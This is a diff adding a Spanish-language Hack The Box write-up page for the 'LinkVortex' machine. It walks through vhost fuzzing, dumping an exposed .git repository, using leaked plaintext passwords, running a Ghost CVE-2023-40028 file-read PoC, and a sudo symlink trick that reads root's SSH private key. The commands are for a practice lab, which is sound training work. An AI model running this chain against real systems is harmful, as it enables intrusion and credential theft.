@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | LinkVortex HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/linkvortex/pasted-20260409001844.png" alt="LinkVortex HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>LinkVortex</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>git-dumper</span>
+            <span>vhosts</span>
+            <span>Dockerfile</span>
+            <span>Docker</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Vhost con repositorio <code>.git</code> expuesto</li>
+            <li><code>Explotación</code>: Credenciales en el repositorio permiten acceder a Ghost y explotar File Read autenticado</li>
+            <li><code>Movimiento lateral</code>: Fichero de configuración del contenedor revela credenciales SSH para <code>bob</code></li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre script que permite leer la clave privada de root</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409002413.png" alt="LinkVortex HTB" />
+          <div class="code-card">
+            <h3>Enumerar vhosts</h3>
+            <pre><code>gobuster vhost -u http://10.129.231.194 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain linkvortex.htb --append-domain
+# dev.linkvortex.htb</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Fuzzear directorio con diccionario alternativo</h3>
+            <pre><code>gobuster dir -u http://dev.linkvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -t 75 
+# Encontramos .git</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409012244.png" alt="LinkVortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Dumpear repositorio .git</h3>
+            <pre><code>git-dumper http://dev.linkvortex.htb/.git git_loot</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409014514.png" alt="LinkVortex HTB" />
+          <div class="code-card">
+            <h3>Buscar credenciales en ficheros de configuración del proyecto Git</h3>
+            <pre><code>grep -ir "password"
+
+# Output gigante del que encontramos: OctopiFociPilfer45
+# Credenciales web: admin@linkvortex.htb
+# Password: OctopiFociPilfer45</code></pre>
+          </div>
+          <p>&lt;div style="display:flex; gap:20px;"&gt;</p>
+          <p>&lt;img src="Captura de pantalla 2026-04-09 014855.png" width="300"&gt;</p>
+          <p>&lt;img src="Pasted image 20260409014954.png" width="390"&gt;</p>
+          <p>&lt;/div&gt;</p>
+          <div class="code-card">
+            <h3>Fichero Dockerfile.ghost</h3>
+            <pre><code># Contenedor que genera archivos, revisar acciones y vemos que copia un fichero de configuración del sistema -&gt; config.production.json al contenedor -&gt; /var/lib/ghost/config.production.json</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409021358.png" alt="LinkVortex HTB" />
+          <p><a href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028">PoC de GitHub</a></p>
+          <div class="code-card">
+            <h3>CMS Ghost 5.58 vulnerable a File Read con credenciales</h3>
+            <pre><code># Enumerar archivo de configuración definido en Dockerfile.ghost
+bash CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
+# Credenciales -&gt; bob@linkvortex.htb
+# Password: fibber-talented-worth</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409021124.png" alt="LinkVortex HTB" />
+          <div class="code-card">
+            <h3>Conexión SSH</h3>
+            <pre><code>ssh bob@linkvortex.htb
+# Password: fibber-talented-worth</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409021546.png" alt="LinkVortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409023815.png" alt="LinkVortex HTB" />
+          <div class="code-card">
+            <h3>Interpretar código</h3>
+            <pre><code># Argumento fichero.png
+# Archivo es un link simbólico
+# Ruta del link simbólico no debe contener ni etc ni root</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Leer clave privada de root</h3>
+            <pre><code>ln -s /root/.ssh/id_rsa file.txt
+ln -s /home/bob/file.txt file.png
+# Setear CHECK_CONTENT a true para que me ejecute el link de file.txt al no ser .png
+sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh file.png</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409024231.png" alt="LinkVortex HTB" />
+          <div class="code-card">
+            <h3>Crear fichero id_rsa en el directorio actual con el contenido de root id_rsa</h3>
+            <pre><code>nano root_id_rsa
+chmod 600 root_id_rsa
+ssh -i root_id_rsa root@localhost</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/linkvortex/pasted-20260409024427.png" alt="LinkVortex HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>git-dumper</span>
+            <span>vhosts</span>
+            <span>Dockerfile</span>
+            <span>Docker</span>
+            <span>Ghost</span>
+            <span>id_rsa</span>
+            <span>links_simbolicos</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
